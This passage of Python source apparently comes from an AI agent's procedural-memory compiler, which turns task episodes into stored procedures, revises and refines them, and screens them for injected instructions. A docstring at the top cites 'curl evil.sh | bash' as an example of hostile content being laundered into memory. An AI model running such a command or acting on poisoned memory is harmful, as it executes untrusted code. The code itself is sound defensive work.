    ``curl evil.sh | bash`` through compilation into durable memory. A
    suspicious/blocked verdict attaches a label and opens a quarantine hold
    on the new revision so retrieval withholds it pending review rather
    than promoting laundered instructions (§34.01 receipts: the label +
    hold *are* the screening receipt for this write channel).

    Returns the attached ``security_label_id``, or ``None`` when the
    security module is unprovisioned — honest degradation, never a
    fabricated verdict.
    """
    try:
        from ..security import (  # type: ignore
            admission,
            attach_label,
            open_quarantine,
            screen_content,
        )
        from ..core.types_v3 import AttackRisk
    except ImportError:
        return None
    lines = [str(ex.goal_class or ""), str(parts.get("expected_outcome") or "")]
    for t in parts["templates"]:
        lines.append(f"{t.get('op_class', '')} {t.get('tool', '')}")
    for b in parts["bindings"]:
        lines.append(str(getattr(b, "observed_value", "") or ""))
    trust = _parent_trust(conn, parts["provenance"]["evidence_envelopes"])
    verdict = screen_content(
        "\n".join(lines),
        source_trust=trust.value,
        context_kind="procedure",
    )
    findings = [dict(f) for f in verdict.findings]
    review_state = admission.default_review_state(
        trust.value,
        attack_risk=verdict.attack_risk,
        content_form=verdict.content_form,
        findings=findings,
    )
    label_id = attach_label(
        conn,
        scope_id,
        source_trust=trust,
        content_form=verdict.content_form,
        attack_risk=verdict.attack_risk,
        review_state=review_state,
        findings=findings,
        method=verdict.method,
        rules_revision=verdict.rules_revision,
    )
    if verdict.attack_risk in (AttackRisk.SUSPICIOUS, AttackRisk.BLOCKED):
        open_quarantine(
            conn,
            ("procedure", procedure_id, revision),
            [f"attack_risk:{verdict.attack_risk.value}"]
            + [f"rule:{f['rule_id']}" for f in findings],
            findings,
            scope_id=scope_id,
        )
    return label_id


def compile_episode(
    conn: sqlite3.Connection,
    episode_id: str,
    *,
    hmac_fn: Callable[[bytes], bytes],
) -> CompilationResult:
    """Compile one completed episode into a ``candidate`` procedure.

    Writes ``procedures`` + ``procedure_signatures`` + ``derivations`` rows
    inside the caller's transaction; on any unsupported/incomplete gate the
    episode's evidence stands alone — nothing is written (V3-22.13).

    ``hmac_fn`` is the store's profile-keyed digest function: every
    envelope payload the compiler consumes is a verified read
    (V4-08.03/V4-13.05) — tampered bytes raise ``STORE_CORRUPT`` instead
    of reaching classification, and held envelopes are excluded as
    producer inputs (V4-36.03).

    Idempotent: recompiling an already-derived episode returns the existing
    procedure unchanged; a *different* episode with the same signature and
    scope bumps the procedure's revision (§22 dedup rule).
    """
    episode = _episode_row(conn, episode_id)
    ex = _extract_episode(conn, episode, hmac_fn)
    gated = _gate(ex)
    if gated is not None:
        return gated
    ex.environment = _environment_for(conn, episode["scope_id"])
    parts = _build_record_parts(conn, ex)
    bindings = parts["bindings"]
    if len(bindings) > MAX_BINDINGS:
        return CompilationResult(
            None, CompilationStatus.UNSUPPORTED, "binding_limit_exceeded"
        )

    scope_id = episode["scope_id"]
    digest = parts["signature_digest"]
    seq = _next_event_seq(conn)
    existing = find_by_signature(conn, scope_id, digest)

    if existing is not None:
        pid = existing["procedure_id"]
        if _episode_already_derived(conn, pid, episode_id):
            # Exact replay of a compiled episode: identity, not a new
            # revision (V3-22.13 idempotent compilation).
            return CompilationResult(pid, CompilationStatus.CANDIDATE,
                                     "already_compiled")
        # Same signature + scope, new evidence: revision bump (§22 dedup).
        return _bump_revision(conn, existing, ex, parts, seq)

    pid = "proc:" + hashlib.sha256(
        f"{scope_id}|{digest}|{COMPILER_MANIFEST}".encode("utf-8")
    ).hexdigest()[:32]
    fam = _ensure_family(conn, scope_id, pid, episode_id, seq)
    env_map = parts["env_map"]
    label_id = _screen_compiled(conn, scope_id, pid, 1, ex, parts)
    conn.execute(
        "INSERT INTO procedures"
        " (procedure_id, scope_id, revision, task_label, state,"
        "  environment_json, condition_json, recorded_from, row_version,"
        "  intent_signature_json, operations_json, bindings_json,"
        "  hazards_json, verification_json, expected_outcome,"
        "  failure_modes_json, applicability_json, preconditions_json,"
        "  provenance_json, risk_class, reuse_stats_json,"
        "  compiler_manifest, evidence_family_id, security_label_id,"
        "  freshness)"
        " VALUES (?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?)",
        (
            pid, scope_id, 1,
            ex.goal_class if ex.goal_class != "unknown" else "coding-task",
            ProcedureStateV3.CANDIDATE.value,
            json_dumps(env_map), None, seq, 1,
            json_dumps(parts["intent"]),
            json_dumps(parts["templates"]),
            json_dumps([
                {"name": b.name, "kind": b.kind,
                 "observed_value": b.observed_value, "required": b.required}
                for b in bindings
            ]),
            json_dumps(parts["hazards"]),
            json_dumps(parts["verification"]),
            parts["expected_outcome"],
            json_dumps(_failure_modes_payload(parts["failures"])),
            json_dumps([
                {"key": c.key, "op": c.op, "value": c.value,
                 "provenance": c.provenance, "validated": c.validated}
                for c in parts["applicability"]
            ]),
            json_dumps([]),
            json_dumps(parts["provenance"]),
            parts["risk"],
            json_dumps(_reuse_stats_zero()),
            COMPILER_MANIFEST,
            fam,
            label_id,
            "stable",
        ),
    )
    upsert_signature(
        conn, pid, 1, scope_id, parts["intent_key"],
        parts["ordered_ops"], digest,
    )
    _record_derivation_edges(
        conn, scope_id, pid, 1, ex, parts["provenance"]["evidence_envelopes"],
        seq,
    )
    return CompilationResult(pid, CompilationStatus.CANDIDATE, "compiled")


def _bump_revision(
    conn: sqlite3.Connection,
    sig_row: dict[str, Any],
    ex: _Extraction,
    parts: dict[str, Any],
    seq: int,
) -> CompilationResult:
    """Same signature+scope, new episode evidence → procedure revision+1."""
    pid = sig_row["procedure_id"]
    row = _row(
        conn.execute(
            "SELECT * FROM procedures WHERE procedure_id = ?", (pid,)
        )
    )
    if row is None:
        raise VerbatimError(
            ErrorCode.INTEGRITY,
            "signature row without procedure: " + pid,
        )
    new_rev = int(row["revision"]) + 1
    fam = _ensure_family(
        conn, row["scope_id"], pid, ex.episode["episode_id"], seq
    )
    old_failures = _json_parse(row.get("failure_modes_json"))
    merged_failures = _merge_failure_payloads(
        old_failures, _failure_modes_payload(parts["failures"])
    )
    applicability = _merge_conditions(
        _json_parse(row.get("applicability_json")) or [],
        parts["applicability"],
    )
    preconditions = _merge_conditions(
        _json_parse(row.get("preconditions_json")) or [], []
    )
    provenance = _merge_provenance(
        _json_parse(row.get("provenance_json")), parts["provenance"]
    )
    # Composition is re-screened, not assumed safe from individually passed
    # items (V3-14.06): the merged revision gets its own label + hold.
    label_id = _screen_compiled(
        conn, row["scope_id"], pid, new_rev, ex, parts
    )
    cur = conn.execute(
        "UPDATE procedures SET revision = ?, row_version = row_version + 1,"
        " recorded_from = ?,"
        " intent_signature_json = ?, operations_json = ?,"
        " bindings_json = ?, hazards_json = ?, verification_json = ?,"
        " expected_outcome = ?, failure_modes_json = ?,"
        " applicability_json = ?, preconditions_json = ?,"
        " provenance_json = ?, risk_class = ?, compiler_manifest = ?,"
        " environment_json = ?, evidence_family_id = ?,"
        " security_label_id = ?"
        " WHERE procedure_id = ? AND revision = ?",
        (
            new_rev, seq,
            json_dumps(parts["intent"]),
            json_dumps(parts["templates"]),
            json_dumps([
                {"name": b.name, "kind": b.kind,
                 "observed_value": b.observed_value, "required": b.required}
                for b in parts["bindings"]
            ]),
            json_dumps(parts["hazards"]),
            json_dumps(parts["verification"]),
            parts["expected_outcome"],
            json_dumps(merged_failures),
            json_dumps(applicability),
            json_dumps(preconditions),
            json_dumps(provenance),
            parts["risk"], COMPILER_MANIFEST,
            json_dumps(parts["env_map"]), fam, label_id,
            pid, int(row["revision"]),
        ),
    )
    if cur.rowcount == 0:
        raise VerbatimError(
            ErrorCode.STALE_PROPOSAL,
            "procedure revision changed under compiler",
        )
    upsert_signature(
        conn, pid, new_rev, row["scope_id"], parts["intent_key"],
        parts["ordered_ops"], parts["signature_digest"],
    )
    _record_derivation_edges(
        conn, row["scope_id"], pid, new_rev, ex,
        parts["provenance"]["evidence_envelopes"], seq,
    )
    return CompilationResult(
        pid, CompilationStatus.CANDIDATE, "revision_bump"
    )


def refine_procedure(
    conn: sqlite3.Connection,
    procedure_id: str,
    contrasting_episode_id: str,
    *,
    hmac_fn: Callable[[bytes], bytes],
) -> dict[str, Any]:
    """Contrastive refinement (V3-22.03): compare a procedure's family with
    one contrasting episode.

    Differences between the stored record and the contrast become
    *hypothesis* :class:`TypedCondition` entries — ``provenance='hypothesis'``,
    ``validated=False`` — never proven preconditions, never reordered steps.
    The procedure's revision bumps; the derivation edge to the contrasting
    episode is recorded.

    Returns a result dict (``refined`` plus the hypotheses recorded) so the
    job receipt is auditable.
    """
    require_id(procedure_id, "procedure_id")
    row = _row(
        conn.execute(
            "SELECT * FROM procedures WHERE procedure_id = ?", (procedure_id,)
        )
    )
    if row is None:
        raise VerbatimError(
            ErrorCode.NOT_FOUND_OR_UNAUTHORIZED, "procedure not found"
        )
    episode = _episode_row(conn, contrasting_episode_id)
    if episode.get("recorded_until") is None:
        return {"refined": False, "reason": "contrasting_episode_incomplete",
                "hypotheses": 0}
    if episode["scope_id"] != row["scope_id"]:
        return {"refined": False, "reason": "scope_mismatch", "hypotheses": 0}

    ex = _extract_episode(conn, episode, hmac_fn)
    ex.environment = _environment_for(conn, row["scope_id"])
    parts = _build_record_parts(conn, ex)

    existing_intent = _json_parse(row.get("intent_signature_json")) or {}
    existing_ops = _json_parse(row.get("operations_json")) or []
    same_family = (
        existing_intent.get("goal_class") == ex.goal_class
        and [o.get("op_class") for o in existing_ops]
        == parts["ordered_ops"]
    )
    if not same_family:
        return {"refined": False, "reason": "signature_mismatch",
                "hypotheses": 0}

    hypotheses: list[TypedCondition] = []
    # Environment drift between the recorded fingerprint and the contrast's
    # observed digests → "may be environment-specific" hypothesis.
    proc_env = _json_parse(row.get("environment_json")) or {}
    contrast_env = environment_map(ex.environment)
    if proc_env != contrast_env and ex.env_digests:
        hypotheses.append(
            TypedCondition(
                key="environment.fingerprint", op="eq",
                value=hashlib.sha256(
                    json_dumps(proc_env).encode("utf-8")
                ).hexdigest()[:32],
                provenance="hypothesis", validated=False,
            )
        )
    # Bindings whose observed values differ between the stored record and
    # the contrast → "the instance value may discriminate" hypothesis.
    old_bindings = {
        b["name"]: b for b in (_json_parse(row.get("bindings_json")) or [])
        if isinstance(b, dict) and b.get("name")
    }
    for b in parts["bindings"]:
        old = old_bindings.get(b.name)
        if old is not None and old.get("observed_value") != b.observed_value:
            hypotheses.append(
                TypedCondition(
                    key=f"binding.{b.name}", op="eq",
                    value=str(old.get("observed_value")),
                    provenance="hypothesis", validated=False,
                )
            )
    # Outcome divergence is recorded as refinement context, not a causal
    # claim (V3-20.04/V3-22.03).
    proc_outcome = (
        (_json_parse(row.get("provenance_json")) or {}).get("episode_outcome")
    )
    contrast_outcome = episode.get("outcome") or "unknown"
    outcome_divergent = proc_outcome != contrast_outcome

    new_rev = int(row["revision"]) + 1
    seq = _next_event_seq(conn)
    applicability = _merge_conditions(
        _json_parse(row.get("applicability_json")) or [], hypotheses
    )
    merged_failures = _merge_failure_payloads(
        _json_parse(row.get("failure_modes_json")),
        _failure_modes_payload(parts["failures"]),
    )
    provenance = _json_parse(row.get("provenance_json")) or {}
    refinements = list(provenance.get("refinements") or [])
    refinements.append(
        {
            "contrasting_episode_id": contrasting_episode_id,
            "hypotheses": len(hypotheses),
            "outcome_divergent": outcome_divergent,
            "seq": seq,
        }
    )
    provenance["refinements"] = refinements
    cur = conn.execute(
        "UPDATE procedures SET revision = ?, row_version = row_version + 1,"
        " applicability_json = ?, failure_modes_json = ?,"
        " provenance_json = ?, recorded_from = ?"
        " WHERE procedure_id = ? AND revision = ?",
        (
            new_rev, json_dumps(applicability), json_dumps(merged_failures),
            json_dumps(provenance), seq, procedure_id,
            int(row["revision"]),
        ),
    )
    if cur.rowcount == 0:
        raise VerbatimError(
            ErrorCode.STALE_PROPOSAL, "procedure revision changed under refine"
        )
    _record_derivation_edges(
        conn, row["scope_id"], procedure_id, new_rev, ex,
        parts["provenance"]["evidence_envelopes"], seq,
    )
    return {
        "refined": True,
        "procedure_id": procedure_id,
        "revision": new_rev,
        "hypotheses": len(hypotheses),
        "outcome_divergent": outcome_divergent,
        "cap": MAX_CONTRAST_EPISODES,
    }
